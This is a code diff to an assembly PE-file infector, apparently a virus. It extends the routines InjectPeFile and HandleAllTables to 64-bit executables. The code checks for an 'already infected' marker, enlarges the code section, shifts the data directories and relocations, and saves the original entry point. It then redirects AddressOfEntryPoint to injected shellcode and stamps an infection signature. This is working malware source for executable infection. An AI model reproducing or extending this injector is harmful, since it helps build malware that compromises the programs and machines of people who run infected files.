@@ -304,6 +304,8 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     local fAlignAddSize:dword
     local dwTmp:dword
     local cwTmp:cword
+    local pCurrNtHead:cword
+    local is_x64:byte
 
     mov [VAsc], 0
 
@@ -313,20 +315,29 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
 		mov [rbp + 20h], r8
 		mov [rbp + 28h], r9
 	endif
-
-    mov cax, [pe]
-    mov ccx, [cax].PeHeaders.mem
+    
+    mov cdi, [pe]
+    mov ccx, [cdi].PeHeaders.mem
     mov [peMem], ccx
-    mov cax, [cax].PeHeaders.doshead
+    mov cax, [cdi].PeHeaders.doshead
     add cax, INJ_SIGN_OFFSET
     .if  byte ptr [cax] == INJECTION_SIGN
         invoke sc_printf, addr [cbx + msgErrorAlreadyInfected]
         xor cax, cax
         ret
     .endif
-    
-    mov cax, [pe]
-    mov cax, [cax].PeHeaders.nthead
+    mov al, byte ptr [cdi].PeHeaders.isPe64
+    mov [is_x64], al
+    .if byte ptr [cdi].PeHeaders.isPe64 == 1
+        mov cax, [cdi].PeHeaders.nthead64
+        mov [pCurrNtHead], cax
+    .else
+        mov cax, [cdi].PeHeaders.nthead
+        mov [pCurrNtHead], cax
+    .endif
+
+    ;mov cax, [pe]
+    mov cax, [pCurrNtHead]
     lea cax, [cax].IMAGE_NT_HEADERS.FileHeader
     .if [cax].IMAGE_FILE_HEADER.Characteristics & IMAGE_FILE_RELOCS_STRIPPED
         invoke sc_printf, addr [cbx + msgErrorRelocs]
@@ -335,13 +346,21 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
 
     ; расчет
     ;DbgBreak 
-    mov cdx, [pe]
-    mov cdx, [cdx].PeHeaders.nthead
+    ;mov cdx, [pe]
+    mov cdx, [pCurrNtHead]
     lea cdi, [cdx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ecx, [cdi].IMAGE_OPTIONAL_HEADER.FileAlignment
-    mov [fileAligment], ecx
-    mov ecx, [cdi].IMAGE_OPTIONAL_HEADER.SectionAlignment
-    mov [secAligm], ecx
+    
+    .if byte ptr [is_x64] == 1
+        mov ecx, [cdi].IMAGE_OPTIONAL_HEADER64.FileAlignment
+        mov [fileAligment], ecx
+        mov ecx, [cdi].IMAGE_OPTIONAL_HEADER64.SectionAlignment
+        mov [secAligm], ecx
+    .else
+        mov ecx, [cdi].IMAGE_OPTIONAL_HEADER32.FileAlignment
+        mov [fileAligment], ecx
+        mov ecx, [cdi].IMAGE_OPTIONAL_HEADER32.SectionAlignment
+        mov [secAligm], ecx
+    .endif
 
     ; Находим адрес конца первой кодовой секции
     
@@ -425,11 +444,16 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     invoke HandleAllTables, [pe], [VAsc], [fAlignAddSize], [sAlignAddSize]
 
     mov cdi, [pe]
-    mov cdi, [cdi].PeHeaders.nthead
+    mov cdi, [pCurrNtHead]
     lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
     mov ecx, [sAlignAddSize]
-    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfImage, ecx
-    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfCode, ecx
+    .if byte ptr [is_x64] == 1
+        add [cdi].IMAGE_OPTIONAL_HEADER64.SizeOfImage, ecx
+        add [cdi].IMAGE_OPTIONAL_HEADER64.SizeOfCode, ecx
+    .else
+        add [cdi].IMAGE_OPTIONAL_HEADER32.SizeOfImage, ecx
+        add [cdi].IMAGE_OPTIONAL_HEADER32.SizeOfCode, ecx
+    .endif
     ;add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
     ; сдвигаем все, что ниже
 
@@ -441,9 +465,20 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     add eax, [fAlignAddSize]
     invoke LoadPeFile, [cdx].PeHeaders.filename, [pe], cax
 
-    mov cax, [pe]
-    mov cax, [cax].PeHeaders.mem
-    mov [peMem], cax
+    
+    mov cdi, [pe]
+    mov ccx, [cdi].PeHeaders.mem
+    mov [peMem], ccx
+
+    mov al, byte ptr [cdi].PeHeaders.isPe64
+    mov [is_x64], al
+    .if byte ptr [cdi].PeHeaders.isPe64 == 1
+        mov cax, [cdi].PeHeaders.nthead64
+        mov [pCurrNtHead], cax
+    .else
+        mov cax, [cdi].PeHeaders.nthead
+        mov [pCurrNtHead], cax
+    .endif
 
     invoke FindTargetSection, [pe]
     .if cax == NULL
@@ -494,7 +529,6 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     
     invoke64 sc_memmove, cdi, csi, [sizeMovedData]
     invoke64 sc_memset, [pSC], 041h, [cbx + scInfo.alScSize]
-    
 
     ;DbgBreak
     mov ccx, [targetSection]
@@ -506,15 +540,19 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
      ; секции
     mov cdi, [pe]
     mov csi, [cdi].PeHeaders.sections
-    mov ccx, [cdi].PeHeaders.nthead
+    mov ccx, [pCurrNtHead]
     lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
-    mov edx, [VAsc]
-    ;.if [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint >= edx
+    .if byte ptr [is_x64] == 1
         mov edx, [fAlignAddSize]
-        add [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, edx 
-        mov edx, [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
+        add [ccx].IMAGE_OPTIONAL_HEADER64.AddressOfEntryPoint, edx 
+        mov edx, [ccx].IMAGE_OPTIONAL_HEADER64.AddressOfEntryPoint
         mov [cbx + scInfo.originalEP], edx
-    ;.endif
+    .else
+        mov edx, [fAlignAddSize]
+        add [ccx].IMAGE_OPTIONAL_HEADER32.AddressOfEntryPoint, edx 
+        mov edx, [ccx].IMAGE_OPTIONAL_HEADER32.AddressOfEntryPoint
+        mov [cbx + scInfo.originalEP], edx
+    .endif
     xor ccx, ccx
     xor cax, cax
 
@@ -545,9 +583,9 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     ; точка вход
     mov eax, [cbx + scInfo.startRVA]
     mov cdx, [pe]
-    mov cdi, [cdx].PeHeaders.nthead
+    mov cdi, [pCurrNtHead]
     lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
-    mov [cdi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax
+    mov [cdi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax    ; поле AddressOfEntryPoint находится до полей, которые могут нарушить смещения
     
     mov cdx, [cdx].PeHeaders.mem
     mov byte ptr [cdx + INJ_SIGN_OFFSET], INJECTION_SIGN
@@ -636,6 +674,9 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
     local fileAligment:dword
     local i:cword
     local ind:dword
+    local pCurrNtHead:cword
+    local is_x64:byte
+    local pDataDir:cword
 
     ifdef _WIN64
 		mov [rbp + 10h], rcx
@@ -646,12 +687,25 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
 
     ; Обрабатываем директории
     mov cax, [pe]
-    mov cax, [cax].PeHeaders.nthead
-    lea cdi, [cax].IMAGE_NT_HEADERS.OptionalHeader;.DataDirectory
-    mov edx, [cdi].IMAGE_OPTIONAL_HEADER.FileAlignment
-    mov [fileAligment], edx
-	lea cdi, [cdi].IMAGE_OPTIONAL_HEADER.DataDirectory
-    
+    .if byte ptr [cax].PeHeaders.isPe64 == 1
+        mov cdx, [cax].PeHeaders.nthead64
+        mov byte ptr [is_x64], 1
+    .else
+        mov cdx, [cax].PeHeaders.nthead
+        mov byte ptr [is_x64], 0
+    .endif
+    mov [pCurrNtHead], cdx
+
+    mov cax, [pCurrNtHead]
+    lea cdi, [cax].IMAGE_NT_HEADERS.OptionalHeader
+    ; mov edx, [cdi].IMAGE_OPTIONAL_HEADER.FileAlignment
+    ; mov [fileAligment], edx
+    .if byte ptr [is_x64] == 1
+	    lea cdi, [cdi].IMAGE_OPTIONAL_HEADER64.DataDirectory
+    .else
+        lea cdi, [cdi].IMAGE_OPTIONAL_HEADER32.DataDirectory
+    .endif
+    mov [pDataDir], cdi
     
     ;DbgBreak
     xor ccx, ccx
@@ -695,10 +749,7 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
     .endw    
 
     ; релоки в последнюю очередь 
-    mov cax, [pe]       
-    mov cax, [cax].PeHeaders.nthead
-    lea cdi, [cax].IMAGE_NT_HEADERS.OptionalHeader;.DataDirectory
-    lea cdi, [cdi].IMAGE_OPTIONAL_HEADER.DataDirectory
+    mov cdi, [pDataDir]
     xor cax, cax
     add cax, IMAGE_DIRECTORY_ENTRY_BASERELOC
     imul cax, IMAGE_DATA_DIRECTORY_SIZE
@@ -1216,7 +1267,7 @@ include proc_work.asm
 ifdef _WIN64
 
 else
-include hde32_sc.asm
+;include hde32_sc.asm
 endif
 
 DefineStr ExitProcess
